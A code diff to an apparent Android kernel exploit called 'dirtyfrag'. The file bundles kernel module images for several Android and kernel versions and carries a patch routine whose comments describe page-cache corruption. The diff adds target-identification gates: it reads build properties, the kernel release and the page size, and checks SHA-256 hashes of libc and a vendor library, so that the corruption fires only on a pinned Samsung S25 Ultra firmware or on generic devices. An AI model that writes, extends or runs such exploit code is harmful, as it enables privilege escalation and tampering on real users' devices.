@@ -25,7 +25,10 @@
 #include <jni.h>
 #include <sched.h>
 #include <sys/mman.h>
+#include <sys/system_properties.h>
 #include "logging.h"
+#include "target_profile.h"
+#include "sha256.h"
 
 #ifndef UDP_ENCAP
 #define UDP_ENCAP 100
@@ -688,55 +691,190 @@ extern char dirtyfrag_ko_17_6_18_end[];
 extern char splice_helper_start[];
 extern char splice_helper_end[];
 
-struct KoImage {
-    int android_release;
-    int kver_major;
-    int kver_minor;
-    const char *start;
-    const char *end;
+/*
+ * The compiled-in module table. Kernel-FAMILY selection (dfr_select_ko_image)
+ * and the uname parse (dfr_parse_kernel_versions) live in target_profile.c so
+ * that the identical logic is exercised by the off-device unit tests; this
+ * table is the only part that must stay here because it points at the .incbin
+ * payload symbols above. Behaviour is unchanged from upstream.
+ */
+static const struct KoImage ko_images[] = {
+    {12, 5, 10, dirtyfrag_ko_12_5_10_start, dirtyfrag_ko_12_5_10_end},
+    {13, 5, 10, dirtyfrag_ko_13_5_10_start, dirtyfrag_ko_13_5_10_end},
+    {13, 5, 15, dirtyfrag_ko_13_5_15_start, dirtyfrag_ko_13_5_15_end},
+    {14, 5, 15, dirtyfrag_ko_14_5_15_start, dirtyfrag_ko_14_5_15_end},
+    {14, 6, 1, dirtyfrag_ko_14_6_1_start, dirtyfrag_ko_14_6_1_end},
+    {15, 6, 6, dirtyfrag_ko_15_6_6_start, dirtyfrag_ko_15_6_6_end},
+    {16, 6, 12, dirtyfrag_ko_16_6_12_start, dirtyfrag_ko_16_6_12_end},
+    {17, 6, 18, dirtyfrag_ko_17_6_18_start, dirtyfrag_ko_17_6_18_end},
 };
+#define KO_IMAGES_N (sizeof(ko_images) / sizeof(ko_images[0]))
 
 static const struct KoImage *select_ko_image(int android_release, int kver_major, int kver_minor) {
-    static const struct KoImage images[] = {
-        {12, 5, 10, dirtyfrag_ko_12_5_10_start, dirtyfrag_ko_12_5_10_end},
-        {13, 5, 10, dirtyfrag_ko_13_5_10_start, dirtyfrag_ko_13_5_10_end},
-        {13, 5, 15, dirtyfrag_ko_13_5_15_start, dirtyfrag_ko_13_5_15_end},
-        {14, 5, 15, dirtyfrag_ko_14_5_15_start, dirtyfrag_ko_14_5_15_end},
-        {14, 6, 1, dirtyfrag_ko_14_6_1_start, dirtyfrag_ko_14_6_1_end},
-        {15, 6, 6, dirtyfrag_ko_15_6_6_start, dirtyfrag_ko_15_6_6_end},
-        {16, 6, 12, dirtyfrag_ko_16_6_12_start, dirtyfrag_ko_16_6_12_end},
-        {17, 6, 18, dirtyfrag_ko_17_6_18_start, dirtyfrag_ko_17_6_18_end},
-    };
-    const struct KoImage *fallback = NULL;
-    size_t i;
-    for (i = 0; i < sizeof(images) / sizeof(images[0]); i++) {
-        if (images[i].kver_major != kver_major || images[i].kver_minor != kver_minor)
-            continue;
-        if (images[i].android_release == android_release)
-            return &images[i];
-        if (fallback == NULL)
-            fallback = &images[i];
-    }
-    return fallback;
+    return dfr_select_ko_image(ko_images, KO_IMAGES_N, android_release, kver_major, kver_minor);
 }
 
 static int read_device_versions(int *android_release, int *kver_major, int *kver_minor) {
     struct utsname u;
-    const char *marker;
     if (uname(&u) != 0)
         return -1;
-    if (sscanf(u.release, "%d.%d", kver_major, kver_minor) != 2)
+    return dfr_parse_kernel_versions(u.release, android_release, kver_major, kver_minor);
+}
+
+/* -------- Gate A/B: fail-closed target identity + userspace validation -------- */
+
+static void prop_get(const char *key, char *out, size_t outlen, const char *dflt) {
+    char buf[PROP_VALUE_MAX];
+    int n = __system_property_get(key, buf);
+    if (n <= 0) {
+        snprintf(out, outlen, "%s", dflt ? dflt : "");
+    } else {
+        snprintf(out, outlen, "%s", buf);
+    }
+}
+
+/* Compare one userspace artefact's SHA-256 against the profile; log the gate. */
+static int gate_hash(struct Reporter *reporter, const char *tag,
+                     const char *path, const char *expected) {
+    if (expected == NULL || expected[0] == 0) {
+        REPORTLN("[DFR][USERSPACE] %s UNKNOWN (no pinned hash) path=%s", tag, path);
+        return 0; /* unknown != fail: do not block on an unpinned artefact */
+    }
+    char hex[65];
+    if (dfr_sha256_file_hex(path, hex) != 0) {
+        REPORTLN("[DFR][USERSPACE] %s FAIL cannot read %s (errno=%d)", tag, path, errno);
         return -1;
-    marker = strstr(u.release, "android");
-    if (marker == NULL)
+    }
+    if (strcmp(hex, expected) != 0) {
+        REPORTLN("[DFR][USERSPACE] %s FAIL %s", tag, path);
+        REPORTLN("[DFR][USERSPACE]   expected=%s", expected);
+        REPORTLN("[DFR][USERSPACE]   actual  =%s", hex);
         return -1;
-    *android_release = atoi(marker + 7);
-    if (*android_release <= 0)
-        return -1;
+    }
+    REPORTLN("[DFR][USERSPACE] %s PASS %s", tag, path);
     return 0;
 }
 
+/*
+ * Gate A (target detection) + Gate B (kernel/userspace validation).
+ * Returns:
+ *   0  -> proceed (exact ZZIC validated, or an unrelated upstream device)
+ *  -1  -> refuse (ZZIC mismatch, or a ZZIC identity that fails validation)
+ * FAIL-CLOSED: on the ZZIC target every Gate B boundary must PASS or the whole
+ * chain aborts before a single page-cache write happens.
+ */
+static int gate_target(struct Reporter *reporter) {
+    char manufacturer[128], model[128], device[128], display[192], fingerprint[256];
+    char abi[64], sdkstr[32];
+    prop_get("ro.product.manufacturer", manufacturer, sizeof(manufacturer), "");
+    prop_get("ro.product.model", model, sizeof(model), "");
+    prop_get("ro.product.device", device, sizeof(device), "");
+    prop_get("ro.build.display.id", display, sizeof(display), "");
+    prop_get("ro.build.fingerprint", fingerprint, sizeof(fingerprint), "");
+    prop_get("ro.product.cpu.abi", abi, sizeof(abi), "");
+    prop_get("ro.build.version.sdk", sdkstr, sizeof(sdkstr), "0");
+
+    struct utsname u;
+    memset(&u, 0, sizeof(u));
+    uname(&u);
+    long page_size = sysconf(_SC_PAGESIZE);
+
+    struct ObservedTarget obs = {
+        .manufacturer = manufacturer, .model = model, .device = device,
+        .sdk = atoi(sdkstr), .display = display, .fingerprint = fingerprint,
+        .kernel_release = u.release, .page_size = page_size, .abi = abi,
+    };
+
+    REPORTLN("[DFR][TARGET] ENTER");
+    REPORTLN("[DFR][TARGET] TARGET_MANUFACTURER=%s", manufacturer);
+    REPORTLN("[DFR][TARGET] TARGET_MODEL=%s", model);
+    REPORTLN("[DFR][TARGET] TARGET_DEVICE=%s", device);
+    REPORTLN("[DFR][TARGET] TARGET_DISPLAY=%s", display);
+    REPORTLN("[DFR][TARGET] TARGET_FINGERPRINT=%s", fingerprint);
+    REPORTLN("[DFR][TARGET] TARGET_SDK=%d", obs.sdk);
+    REPORTLN("[DFR][TARGET] TARGET_KERNEL_RELEASE=%s", u.release);
+    REPORTLN("[DFR][TARGET] TARGET_KERNEL_VERSION=%s", u.version);
+    REPORTLN("[DFR][TARGET] TARGET_PAGE_SIZE=%ld", page_size);
+    REPORTLN("[DFR][TARGET] TARGET_ABI=%s", abi);
+
+    struct TargetMatch m;
+    dfr_target_class cls = dfr_classify_target(&obs, &m);
+    const struct TargetProfile *p = &DFR_PROFILE_ZZIC;
+
+    if (cls == DFR_TARGET_UPSTREAM_GENERIC) {
+        REPORTLN("[DFR][TARGET] TARGET_PROFILE=UPSTREAM_GENERIC");
+        REPORTLN("[DFR][TARGET] PASS (unrelated device; upstream generic path)");
+        return 0;
+    }
+
+    /* Log each individual mismatch for the ZZIC candidate. */
+    if (!m.manufacturer_ok) REPORTLN("[DFR][TARGET] MISMATCH manufacturer: got=%s want=%s", manufacturer, p->manufacturer);
+    if (!m.model_ok)        REPORTLN("[DFR][TARGET] MISMATCH model: got=%s want=%s", model, p->model);
+    if (!m.device_ok)       REPORTLN("[DFR][TARGET] MISMATCH device: got=%s want=%s", device, p->device);
+    if (!m.sdk_ok)          REPORTLN("[DFR][TARGET] MISMATCH sdk: got=%d want=%d", obs.sdk, p->sdk);
+    if (!m.display_ok)      REPORTLN("[DFR][TARGET] MISMATCH display: got=%s want=%s", display, p->display);
+    if (!m.fingerprint_ok)  REPORTLN("[DFR][TARGET] MISMATCH fingerprint: got=%s want=%s", fingerprint, p->fingerprint);
+    if (!m.kernel_release_ok) REPORTLN("[DFR][TARGET] MISMATCH kernel_release: got=%s want=%s", u.release, p->kernel_release);
+    if (!m.page_size_ok)    REPORTLN("[DFR][TARGET] MISMATCH page_size: got=%ld want=%ld", page_size, p->page_size);
+    if (!m.abi_ok)          REPORTLN("[DFR][TARGET] MISMATCH abi: got=%s want=%s", abi, p->abi);
+
+    if (cls == DFR_TARGET_MISMATCH) {
+        REPORTLN("[DFR][TARGET] TARGET_PROFILE=MISMATCH");
+        REPORTLN("[DFR][TARGET] FAIL fail-closed: device asserts the ZZIC model/codename"
+                 " but does not match the pinned firmware. Refusing.");
+        return -1;
+    }
+
+    /* cls == DFR_TARGET_S25U_ZZIC: run Gate B. */
+    REPORTLN("[DFR][TARGET] TARGET_PROFILE=S25U_ZZIC");
+    REPORTLN("[DFR][TARGET] PASS exact identity");
+
+    int rc = 0;
+    REPORTLN("[DFR][KERNEL] ENTER");
+    if (dfr_streq(u.release, p->kernel_release))
+        REPORTLN("[DFR][KERNEL] ZZIC_KERNEL_IDENTITY=PASS");
+    else { REPORTLN("[DFR][KERNEL] ZZIC_KERNEL_IDENTITY=FAIL got=%s want=%s", u.release, p->kernel_release); rc = -1; }
+
+    if (page_size == p->page_size)
+        REPORTLN("[DFR][KERNEL] ZZIC_PAGE_SIZE=PASS (%ld)", page_size);
+    else { REPORTLN("[DFR][KERNEL] ZZIC_PAGE_SIZE=FAIL got=%ld want=%ld", page_size, p->page_size); rc = -1; }
+
+    REPORTLN("[DFR][USERSPACE] ENTER");
+    /* libc.so must be the runtime bionic symlink; validate the resolved target. */
+    char libc_real[512];
+    ssize_t ll = readlink("/system/lib64/libc.so", libc_real, sizeof(libc_real) - 1);
+    if (ll > 0) {
+        libc_real[ll] = 0;
+        REPORTLN("[DFR][USERSPACE] LIBC_SYMLINK=%s", libc_real);
+    } else {
+        REPORTLN("[DFR][USERSPACE] LIBC_SYMLINK not a symlink (errno=%d) - validating in place", errno);
+    }
+
+    if (gate_hash(reporter, "ZZIC_VENDOR_ELF", target_lib_path, p->vendor_target_sha256)) rc = -1;
+    if (gate_hash(reporter, "ZZIC_LIBC_IDENTITY", "/system/lib64/libc.so", p->libc_sha256)) rc = -1;
+    if (gate_hash(reporter, "ZZIC_LIBCXX_IDENTITY", "/system/lib64/libc++.so", p->libcxx_sha256)) rc = -1;
+
+    if (rc == 0) {
+        REPORTLN("[DFR][KERNEL] PASS");
+        REPORTLN("[DFR][USERSPACE] PASS");
+        REPORTLN("[DFR][TARGET] gate A/B complete: proceeding on validated ZZIC target");
+    } else {
+        REPORTLN("[DFR][TARGET] FAIL fail-closed: ZZIC identity but a kernel/userspace"
+                 " boundary did not validate. Refusing before any patch.");
+    }
+    return rc;
+}
+
 int patch_ko(struct Reporter *reporter) {
+    /*
+     * Fail-closed Gate A/B chokepoint: no page-cache corruption runs until the
+     * exact ZZIC target is validated (or the device is proven unrelated and
+     * takes the upstream generic path). A partial ZZIC match aborts here.
+     */
+    if (gate_target(reporter) != 0) {
+        REPORTLN("[DFR][TARGET] aborting: target gate refused");
+        return 1;
+    }
     //char buf[] = {1,2,3,4};
     LOGD("patch1");
     size_t len = splice_helper_end - splice_helper_start;
